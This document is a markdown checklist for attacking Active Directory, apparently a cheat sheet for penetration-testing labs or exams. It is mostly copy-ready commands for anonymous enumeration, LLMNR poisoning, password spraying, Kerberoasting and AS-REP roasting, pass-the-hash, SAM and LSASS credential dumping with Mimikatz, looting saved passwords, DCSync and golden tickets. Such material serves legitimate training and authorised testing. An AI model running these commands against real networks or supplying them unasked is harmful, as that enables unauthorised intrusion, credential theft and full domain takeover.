# AD Attack Checklist

## Phase 0: No Credentials
- [ ] Null session: `nxc smb DC-IP -u '' -p ''`
- [ ] Guest session: `nxc smb DC-IP -u 'guest' -p ''`
- [ ] LDAP anonymous: `ldapsearch -x -H ldap://DC-IP -b "DC=domain,DC=com"`
- [ ] Kerbrute user enum: `kerbrute userenum --dc DC-IP -d DOMAIN userlist.txt`
- [ ] AS-REP roast found users: `impacket-GetNPUsers 'DOMAIN/' -dc-ip DC-IP -usersfile users.txt -no-pass`
- [ ] Check for LLMNR/NBT-NS poisoning: `responder -I eth0`
- [ ] Check for relay opportunities: `nxc smb TARGETS --gen-relay-list relay.txt`

## Phase 1: Got Creds (Low-Priv Domain User)
- [ ] Validate creds: `nxc smb DC-IP -u USER -p PASS`
- [ ] BloodHound collection: `bloodhound-ce-python -u USER -p PASS -ns DC-IP -d DOMAIN -c All --zip`
- [ ] Mark user owned in BloodHound → find paths
- [ ] Enumerate shares: `nxc smb DC-IP -u USER -p PASS --shares`
- [ ] Spider shares for creds: `nxc smb DC-IP -u USER -p PASS -M spider_plus`
- [ ] Kerberoast: `impacket-GetUserSPNs 'DOMAIN/USER:PASS' -dc-ip DC-IP -request`
- [ ] AS-REP roast all users: `impacket-GetNPUsers 'DOMAIN/USER:PASS' -dc-ip DC-IP -request`
- [ ] Check LAPS: `nxc ldap DC-IP -u USER -p PASS --laps`
- [ ] Check gMSA: `nxc ldap DC-IP -u USER -p PASS --gmsa`
- [ ] Enum ADCS: `certipy find -u USER@DOMAIN -p PASS -dc-ip DC-IP -vulnerable`
- [ ] Check MSSQL: `nxc mssql TARGETS -u USER -p PASS`
- [ ] Password spray: `nxc smb DC-IP -u users.txt -p 'CommonPass1' --continue-on-success`
- [ ] Check for delegation: BloodHound → "Shortest Path to Unconstrained Delegation"

## Phase 2: Got Creds (Multiple Users / Service Accounts)
- [ ] Check each user's permissions in BloodHound
- [ ] GenericAll/GenericWrite → targeted kerberoast, password change, RBCD
- [ ] ForceChangePassword → change target's password
- [ ] WriteDACL → grant yourself DCSync
- [ ] AddMember → add yourself to privileged groups
- [ ] MSSQL impersonation → xp_cmdshell
- [ ] WinRM access: `nxc winrm TARGETS -u USER -p PASS`
- [ ] RDP access: `nxc rdp TARGETS -u USER -p PASS`
- [ ] PSExec/WMIExec with admin creds: `impacket-psexec 'DOMAIN/USER:PASS'@TARGET`
- [ ] Pass-the-Hash: `nxc smb TARGETS -u USER -H NTHASH`

## Phase 3: Got Local Admin on a Host
- [ ] Dump SAM: `reg save hklm\sam sam && reg save hklm\system system`
- [ ] Mimikatz logonpasswords: `sekurlsa::logonpasswords`
- [ ] LSASS dump: `comsvcs.dll` → `pypykatz`
- [ ] Check for cached domain creds
- [ ] Check for other users' sessions (token impersonation)
- [ ] Loot: browser creds, KeePass, config files, PowerShell history
- [ ] Pivot to other hosts with found creds

## Phase 4: Domain Admin Path
- [ ] DCSync: `impacket-secretsdump 'DOMAIN/USER:PASS'@DC-IP`
- [ ] Dump NTDS.dit for all domain hashes
- [ ] Golden ticket with krbtgt hash
- [ ] Access all machines with DA hash
- [ ] Get proof: `type C:\Users\Administrator\Desktop\proof.txt`

## Common AD Misconfigs to Always Check
- [ ] Users with SPNs (Kerberoastable)
- [ ] Users with "Do not require Kerberos preauthentication" (AS-REP)
- [ ] Unconstrained delegation machines
- [ ] ADCS misconfigured templates (ESC1-ESC8)
- [ ] GPO abuse paths
- [ ] Nested group memberships giving unexpected privs
